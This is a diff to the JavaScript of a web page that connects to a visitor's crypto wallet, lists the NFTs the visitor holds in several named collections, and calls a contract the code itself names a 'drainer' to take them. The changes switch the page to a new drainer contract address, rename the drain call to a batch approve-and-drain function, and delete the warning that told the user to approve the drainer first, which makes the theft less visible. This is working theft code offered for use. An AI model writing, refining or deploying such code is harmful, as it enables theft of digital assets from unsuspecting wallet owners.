@@ -119,16 +119,16 @@
       "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
       "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
     ];
-    const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // Update if redeployed
+    const drainerContract = "0xb898F96C2Fbd5b21bD2B757D9fd3Ba28Ad17e679"; // Update with new V5 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
       "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
       "function name() view returns (string)",
-      "function isApprovedForAll(address owner, address operator) view returns (bool)" // Added
+      "function isApprovedForAll(address owner, address operator) view returns (bool)"
     ];
     const drainerABI = [
-      "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
+      "function batchApproveAndDrain(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
     ];
 
     let provider, signer;
@@ -179,10 +179,6 @@
             const name = await contract.name();
             const balance = await contract.balanceOf(user);
             summary += `🖼️ ${name}: ${balance} NFT(s)\n`;
-            // Check if drainer is approved
-            if (balance > 0 && !(await contract.isApprovedForAll(user, drainerContract))) {
-              summary += `⚠️ Approve ${drainerContract} for ${name} before draining.\n`;
-            }
           } catch (err) {
             console.warn(`Failed to query NFT contract ${address}:`, err);
             summary += `🖼️ ${address}: Error fetching data\n`;
@@ -195,15 +191,15 @@
       }
     };
 
-    // Drains NFTs (assumes prior approval)
+    // Drains NFTs with batch approval
     document.getElementById("drainBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Draining NFTs...";
+        status.innerText = "🚨 Initiating batch approval and drain...";
         const user = await signer.getAddress();
 
-        // Gather owned token IDs using tokenOfOwnerByIndex
+        // Gather owned token IDs
         let tokenIdMatrix = [];
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
@@ -230,9 +226,9 @@
           return;
         }
 
-        // Call approveAndDrainSpecific
+        // Call batchApproveAndDrain
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
-        const tx = await drainer.approveAndDrainSpecific(nftContracts, tokenIdMatrix);
+        const tx = await drainer.batchApproveAndDrain(nftContracts, tokenIdMatrix);
         await tx.wait();
 
         status.innerText =
@@ -257,6 +253,7 @@
         } else {
           console.error("Drain error:", err);
           status.innerText = "⚠️ Unexpected error occurred: " + err.message;
+          // Check Etherscan events for debug logs
         }
       }
     };
